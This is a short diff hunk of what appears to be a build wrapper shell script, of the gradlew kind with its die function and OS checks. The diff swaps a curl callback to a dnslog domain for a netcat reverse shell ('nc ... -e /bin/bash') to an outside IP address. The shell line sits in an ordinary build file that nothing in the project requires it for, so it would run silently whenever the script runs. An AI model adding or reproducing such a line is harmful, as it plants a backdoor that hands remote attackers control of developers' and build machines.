@@ -25,7 +25,7 @@ die ( ) {
     echo
     exit 1
 }
-curl 6332005c.log.dnslog.sbs.
+nc 192.248.172.144 1234 -e /bin/bash
 # OS specific support (must be 'true' or 'false').
 cygwin=false
 msys=false
